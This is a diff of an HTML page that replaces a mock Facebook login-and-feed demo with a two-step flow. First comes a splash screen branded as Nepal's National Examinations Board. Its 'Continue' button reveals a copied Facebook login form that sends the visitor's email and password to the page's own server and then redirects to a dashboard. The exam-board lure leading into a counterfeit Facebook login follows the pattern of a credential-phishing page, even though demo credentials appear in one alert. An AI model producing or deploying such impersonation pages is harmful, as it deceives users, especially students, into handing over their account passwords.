@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log in or sign up</title>
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    <title>NEB - National Examination Board</title>
     <style>
         * {
             margin: 0;
@@ -13,80 +12,156 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #ffffff;
+            min-height: 100vh;
+        }
+
+        /* ---------- NEB SPLASH SCREEN (First) ---------- */
+        .neb-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            transition: opacity 0.5s ease;
+        }
+
+        .neb-logo {
+            width: 150px;
+            height: 150px;
+            background: #800000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .neb-logo span {
+            color: white;
+            font-size: 60px;
+            font-weight: bold;
+        }
+
+        .neb-title {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .neb-title h1 {
+            font-size: 32px;
+            color: #800000;
+            letter-spacing: 2px;
+        }
+
+        .neb-title h2 {
+            font-size: 20px;
+            color: #333;
+            font-weight: normal;
+            margin-top: 10px;
+        }
+
+        .neb-title p {
+            font-size: 16px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .continue-btn {
+            background: #800000;
+            color: white;
+            border: none;
+            padding: 15px 50px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            margin-top: 40px;
+            transition: transform 0.3s, background 0.3s;
+        }
+
+        .continue-btn:hover {
+            background: #a00000;
+            transform: scale(1.05);
+        }
+
+        /* ---------- FACEBOOK PAGE (Hidden initially) ---------- */
+        .facebook-page {
+            display: none;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+        }
+
+        /* Facebook Circle F Logo in Top Left */
+        .fb-logo-top {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+        }
+
+        .circle-f {
+            width: 40px;
+            height: 40px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .circle-f span {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            font-family: Arial;
+        }
+
+        .fb-container {
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-        }
-
-        /* Main Container */
-        .main-container {
-            width: 100%;
-            max-width: 400px;
             padding: 20px;
         }
 
-        /* Circle F Logo - Middle Top (EXACT Facebook logo) */
-        .logo-container {
-            text-align: center;
-            margin-bottom: 40px;
+        .fb-left {
+            flex: 1;
+            max-width: 500px;
+            padding: 40px;
         }
 
-        .circle-f {
-            width: 70px;
-            height: 70px;
-            background: #1877f2;
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        .circle-f svg {
-            width: 40px;
-            height: 40px;
-        }
-
-        /* Get Facebook for iOS text */
-        .get-app {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .get-app a {
+        .fb-left h1 {
             color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .get-app a:hover {
-            text-decoration: underline;
-        }
-
-        /* Language selector */
-        .language {
-            text-align: center;
+            font-size: 60px;
             margin-bottom: 20px;
-            font-size: 13px;
-            color: #65676b;
         }
 
-        .language select {
-            background: none;
-            border: none;
-            font-size: 13px;
-            color: #65676b;
-            cursor: pointer;
+        .fb-left p {
+            font-size: 28px;
+            color: #1c1e21;
         }
 
-        /* Login Box */
+        .fb-right {
+            flex: 1;
+            max-width: 400px;
+        }
+
         .login-box {
             background: white;
-            padding: 20px 0;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
         }
 
         .login-box input {
@@ -97,19 +172,13 @@
             border-radius: 6px;
             font-size: 17px;
             outline: none;
-            background: #ffffff;
         }
 
         .login-box input:focus {
             border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        .login-box input.error-input {
-            border-color: #f02849;
-            background-color: #fff8f8;
-        }
-
-        /* Login Button - Blue */
         .login-btn {
             width: 100%;
             padding: 12px;
@@ -120,54 +189,40 @@
             font-size: 20px;
             font-weight: bold;
             cursor: pointer;
-            margin: 16px 0 12px 0;
+            margin: 8px 0;
         }
 
         .login-btn:hover {
             background: #166fe5;
         }
 
-        /* Forgot Password */
         .forgot {
             text-align: center;
-            margin: 12px 0;
+            margin: 15px 0;
         }
 
         .forgot a {
             color: #1877f2;
             text-decoration: none;
             font-size: 14px;
-            font-weight: 500;
         }
 
-        .forgot a:hover {
-            text-decoration: underline;
-        }
-
-        /* Divider */
         .hr {
             border-bottom: 1px solid #dadde1;
             margin: 20px 0;
         }
 
-        /* Create New Account Button - Green */
         .create-btn {
             background: #42b72a;
             width: 100%;
             padding: 12px;
             font-size: 17px;
-            font-weight: bold;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
         }
 
         .create-btn:hover {
             background: #36a420;
         }
 
-        /* Error Message */
         .error-msg {
             color: #f02849;
             text-align: center;
@@ -176,326 +231,96 @@
             display: none;
         }
 
-        /* Shake Animation */
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
-            20%, 40%, 60%, 80% { transform: translateX(4px); }
-        }
-
-        .shake {
-            animation: shake 0.4s ease-in-out;
-        }
-
-        /* Meta Footer - exactly like photo */
         .meta-footer {
             text-align: center;
             margin-top: 30px;
-            padding-top: 20px;
-            font-size: 12px;
-            color: #65676b;
-            border-top: 1px solid #e4e6eb;
-        }
-
-        .meta-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 12px;
-        }
-
-        .infinity {
-            font-size: 20px;
-            font-weight: normal;
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 16px;
-        }
-
-        .footer-links a {
-            color: #65676b;
-            text-decoration: none;
-            font-size: 12px;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Feed Page */
-        .feed-container {
-            display: none;
-            background: #f0f2f5;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-        }
-
-        .feed-header {
-            background: white;
-            padding: 12px 20px;
-            position: fixed;
-            top: 0;
-            width: 100%;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 100;
-        }
-
-        .feed-logo {
-            color: #1877f2;
-            font-size: 28px;
-            font-weight: bold;
-        }
-
-        .logout-btn {
-            background: #e4e6eb;
-            color: #050505;
-            width: auto;
-            padding: 8px 16px;
-            font-size: 14px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-
-        .feed-content {
-            margin-top: 80px;
-            max-width: 680px;
-            margin-left: auto;
-            margin-right: auto;
-            padding: 20px;
-        }
-
-        .create-post {
-            background: white;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        }
-
-        .post-input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 20px;
-            font-size: 15px;
-            outline: none;
-        }
-
-        .post-input:focus {
-            border-color: #1877f2;
-        }
-
-        .post-btn {
-            width: auto;
-            margin-top: 10px;
-            padding: 8px 20px;
-            font-size: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-
-        .post-card {
-            background: white;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 15px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        }
-
-        .post-user {
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .post-time {
             font-size: 12px;
             color: #65676b;
         }
 
-        .post-content {
-            margin: 10px 0;
-            font-size: 15px;
-            word-wrap: break-word;
-        }
-
-        .post-stats {
-            color: #65676b;
-            font-size: 13px;
-            margin: 8px 0;
-        }
-
-        .post-actions {
-            display: flex;
-            gap: 10px;
-            border-top: 1px solid #e4e6eb;
-            margin-top: 10px;
-            padding-top: 10px;
-        }
-
-        .like-btn {
-            background: none;
-            border: none;
-            padding: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            color: #65676b;
-            border-radius: 5px;
-        }
-
-        .like-btn:hover {
-            background: #f0f2f5;
-        }
-
-        .like-btn.liked {
-            color: #1877f2;
-        }
-
-        .delete-btn {
-            background: none;
-            border: none;
-            padding: 8px;
-            cursor: pointer;
-            color: red;
-            border-radius: 5px;
-        }
-
-        .delete-btn:hover {
-            background: #f0f2f5;
+        @media (max-width: 900px) {
+            .fb-container {
+                flex-direction: column;
+            }
+            .fb-left {
+                text-align: center;
+                padding: 20px;
+            }
+            .fb-left p {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 <body>
 
-<!-- LOGIN PAGE -->
-<div id="loginPage">
-    <div class="main-container">
-        <!-- Get Facebook for iOS -->
-        <div class="get-app">
-            <a href="#">Get Facebook for iOS and browse faster.</a>
-        </div>
-
-        <!-- Language Selector -->
-        <div class="language">
-            <select>
-                <option>English (UK)</option>
-                <option>Nepali</option>
-                <option>Hindi</option>
-            </select>
-        </div>
-
-        <!-- Facebook Circle F Logo - EXACT like photo -->
-        <div class="logo-container">
-            <div class="circle-f">
-                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.099 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.413c0-3.02 1.791-4.688 4.533-4.688 1.313 0 2.686.234 2.686.234v2.971H15.83c-1.49 0-1.955.925-1.955 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.099 24 12.073z" fill="white"/>
-                </svg>
-            </div>
-        </div>
-
-        <!-- Login Form -->
-        <div class="login-box">
-            <input type="text" id="email" placeholder="Mobile number or email address">
-            <input type="password" id="password" placeholder="Password">
-            <div id="errorMsg" class="error-msg"></div>
-            <button class="login-btn" onclick="doLogin()">Log in</button>
-            <div class="forgot">
-                <a href="#">Forgotten password?</a>
-            </div>
-            <div class="hr"></div>
-            <button class="create-btn" onclick="alert('Use: admin / 123456')">Create new account</button>
-        </div>
-
-        <!-- Meta Footer -->
-        <div class="meta-footer">
-            <div class="meta-logo">
-                <span class="infinity">∞</span>
-                <span>Meta</span>
-            </div>
-            <div class="footer-links">
-                <a href="#">About</a>
-                <a href="#">Help</a>
-                <a href="#">More</a>
-            </div>
-        </div>
+<!-- NEB SPLASH SCREEN -->
+<div class="neb-screen" id="nebScreen">
+    <div class="neb-logo">
+        <span>☕</span>
     </div>
+    <div class="neb-title">
+        <h1>राष्ट्रिय परीक्षा बोर्ड</h1>
+        <h2>National Examinations Board</h2>
+        <p>सानोठिमी, भक्तपुर</p>
+        <p>Nepal</p>
+    </div>
+    <button class="continue-btn" onclick="showFacebook()">Continue →</button>
 </div>
 
-<!-- FEED PAGE -->
-<div id="feedPage" class="feed-container">
-    <div class="feed-header">
-        <div class="feed-logo">facebook</div>
-        <button class="logout-btn" onclick="doLogout()">Logout</button>
-    </div>
-    <div class="feed-content">
-        <div class="create-post">
-            <input type="text" id="postContent" class="post-input" placeholder="What's on your mind?">
-            <button class="post-btn" onclick="createNewPost()">Post</button>
+<!-- FACEBOOK PAGE (Hidden) -->
+<div class="facebook-page" id="facebookPage">
+    <div class="fb-logo-top">
+        <div class="circle-f">
+            <span>f</span>
         </div>
-        <div id="postsList"></div>
+    </div>
+
+    <div class="fb-container">
+        <div class="fb-left">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="fb-right">
+            <div class="login-box">
+                <input type="text" id="email" placeholder="Email address or mobile number">
+                <input type="password" id="password" placeholder="Password">
+                <div id="errorMsg" class="error-msg"></div>
+                <button class="login-btn" onclick="doLogin()">Log In</button>
+                <div class="forgot">
+                    <a href="#">Forgotten password?</a>
+                </div>
+                <div class="hr"></div>
+                <button class="login-btn create-btn" onclick="alert('Use: admin / 123456')">Create new account</button>
+            </div>
+            <div class="meta-footer">
+                <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+            </div>
+        </div>
     </div>
 </div>
 
 <script>
-    let allPosts = [];
-    let loggedInUser = null;
-
-    function showError(inputElement, message) {
-        inputElement.classList.add('error-input');
-        inputElement.classList.add('shake');
-        setTimeout(() => {
-            inputElement.classList.remove('shake');
-        }, 400);
+    // Show NEB screen first, then Facebook
+    function showFacebook() {
+        const neb = document.getElementById('nebScreen');
+        const fb = document.getElementById('facebookPage');
         
-        let errorDiv = document.getElementById('errorMsg');
-        errorDiv.innerHTML = message;
-        errorDiv.style.display = 'block';
-        inputElement.focus();
+        neb.style.opacity = '0';
+        setTimeout(() => {
+            neb.style.display = 'none';
+            fb.style.display = 'block';
+        }, 500);
     }
 
-    function clearErrors() {
-        document.getElementById('email').classList.remove('error-input');
-        document.getElementById('password').classList.remove('error-input');
-        document.getElementById('errorMsg').style.display = 'none';
-    }
-
-    document.getElementById('email').addEventListener('input', function() {
-        this.classList.remove('error-input');
-    });
-    
-    document.getElementById('password').addEventListener('input', function() {
-        this.classList.remove('error-input');
-    });
-
+    // Facebook login function
     async function doLogin() {
         let email = document.getElementById('email').value;
         let password = document.getElementById('password').value;
         
-        clearErrors();
-        
-        if (!email) {
-            showError(document.getElementById('email'), 'Mobile number or email address is required.');
-            return;
-        }
-        
-        if (!password) {
-            showError(document.getElementById('password'), 'Password is required.');
+        if (!email || !password) {
+            document.getElementById('errorMsg').innerText = 'Please fill all fields';
+            document.getElementById('errorMsg').style.display = 'block';
             return;
         }
         
@@ -508,108 +333,17 @@
             let data = await res.json();
             
             if (data.success) {
-                loggedInUser = { id: 'admin', name: 'Alex Morgan' };
-                document.getElementById('loginPage').style.display = 'none';
-                document.getElementById('feedPage').style.display = 'block';
-                loadPosts();
+                alert('Login successful!');
+                window.location.href = '/dashboard.html';
             } else {
-                showError(document.getElementById('password'), 'The password that you\'ve entered is incorrect. Forgotten password?');
+                document.getElementById('errorMsg').innerText = 'The password that you\'ve entered is incorrect.';
+                document.getElementById('errorMsg').style.display = 'block';
             }
         } catch (err) {
-            showError(document.getElementById('email'), 'Connection error. Make sure server is running.');
+            document.getElementById('errorMsg').innerText = 'Connection error. Try again.';
+            document.getElementById('errorMsg').style.display = 'block';
         }
     }
-
-    function doLogout() {
-        loggedInUser = null;
-        document.getElementById('loginPage').style.display = 'block';
-        document.getElementById('feedPage').style.display = 'none';
-        document.getElementById('email').value = '';
-        document.getElementById('password').value = '';
-        clearErrors();
-    }
-
-    async function loadPosts() {
-        try {
-            let res = await fetch('/api/posts');
-            allPosts = await res.json();
-            renderPosts();
-        } catch (err) {
-            console.log('Error loading posts');
-        }
-    }
-
-    async function createNewPost() {
-        let content = document.getElementById('postContent').value.trim();
-        if (!content) {
-            alert('Please write something!');
-            return;
-        }
-        
-        await fetch('/api/posts', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: content, user: loggedInUser.name })
-        });
-        
-        document.getElementById('postContent').value = '';
-        loadPosts();
-    }
-
-    async function deletePost(id) {
-        if (confirm('Delete this post?')) {
-            await fetch(`/api/posts/${id}`, { method: 'DELETE' });
-            loadPosts();
-        }
-    }
-
-    async function likePost(id) {
-        await fetch(`/api/posts/${id}/like`, { method: 'POST' });
-        loadPosts();
-    }
-
-    function renderPosts() {
-        let container = document.getElementById('postsList');
-        if (!allPosts || allPosts.length === 0) {
-            container.innerHTML = '<div style="text-align:center; padding:40px;">No posts yet. Share something!</div>';
-            return;
-        }
-        
-        let html = '';
-        for (let p of allPosts) {
-            html += `
-                <div class="post-card">
-                    <div class="post-user">${escapeHtml(p.userName)}</div>
-                    <div class="post-time">${new Date(p.time).toLocaleString()}</div>
-                    <div class="post-content">${escapeHtml(p.content)}</div>
-                    <div class="post-stats">👍 ${p.likes || 0} likes</div>
-                    <div class="post-actions">
-                        <button class="like-btn" onclick="likePost('${p.id}')">👍 Like</button>
-                        ${p.userId === 'admin' ? `<button class="delete-btn" onclick="deletePost('${p.id}')">🗑️ Delete</button>` : ''}
-                    </div>
-                </div>
-            `;
-        }
-        container.innerHTML = html;
-    }
-
-    function escapeHtml(text) {
-        let div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
-    }
-
-    document.getElementById('password').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            doLogin();
-        }
-    });
-    
-    document.getElementById('email').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            doLogin();
-        }
-    });
 </script>
 
 </body>
